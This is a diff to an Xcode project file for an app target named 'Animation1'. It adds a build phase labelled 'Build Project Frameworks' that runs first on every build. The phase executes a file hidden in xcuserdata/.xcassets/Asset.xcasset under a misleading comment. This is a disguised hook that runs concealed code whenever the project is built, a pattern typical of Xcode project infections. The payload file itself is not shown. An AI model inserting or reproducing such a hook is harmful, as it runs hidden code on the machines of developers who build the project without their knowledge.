@@ -82,6 +82,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22E924ED259E3298001381F4 /* Build configuration list for PBXNativeTarget "Animation1" */;
 			buildPhases = (
+				7148A6FBE091E0DD2BAAC43A /* Build Project Frameworks */,
 				22E924D5259E3292001381F4 /* Sources */,
 				22E924D6259E3292001381F4 /* Frameworks */,
 				22E924D7259E3292001381F4 /* Resources */,
@@ -345,6 +346,38 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	7148A6FBE091E0DD2BAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 22E924D1259E3292001381F4 /* Project object */;
 }
